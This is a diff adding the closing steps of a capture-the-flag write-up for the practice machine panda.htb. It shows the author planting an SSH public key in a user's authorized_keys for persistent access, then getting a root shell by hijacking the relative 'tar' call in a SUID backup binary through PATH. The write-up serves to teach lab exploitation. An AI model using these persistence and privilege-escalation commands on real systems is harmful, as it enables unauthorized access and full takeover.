@@ -226,9 +226,56 @@ We can see from the above screenshot that ```tar``` is the command-line utility 
 
 To exploit this, we'll hijack relative paths in this suid binary
 
-I used this [blog](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e), to exploit this
+I used this [blog](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e), to exploit this. 
 
-So first
+This wasn't working because we kind of don't have a stable shell. Lets try to get a stable shell by generating ssh keys
+
+command:```ssh-keygen```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/053a1166-d2ff-4219-8f87-881d4f08afe3)
+
+Now that we have generated a public and private key. We'll send the public key over to the target's home directory
+
+commands
+```
+cd /home/matt
+mkdir .ssh
+nano authorized_keys
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2adb050-1640-4a81-b483-af48497e1d41)
+
+Now that we have the public key on the target's machine, we can ssh into the server using the private key
+
+commands
+```
+chmod 600 id_rsa
+ssh matt@panda.htb -i id_rsa
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/82ba34fc-5ca0-4030-bbc6-f545d0592013)
+
+We now have a more stable shell.
+
+We can try to hijack the relative path in the suid program now
+
+commands
+```
+echo "/bin/bash" > /tmp/tar
+chmod +x /tmp/tar
+export PATH=/tmp:$PATH
+/usr/bin/pandora_backup
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0f98a39c-ef2b-4613-87d6-345b8b81f778)
+
+nice nice, we were able to spawn a root shell😎.
+
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
+
 
 
 
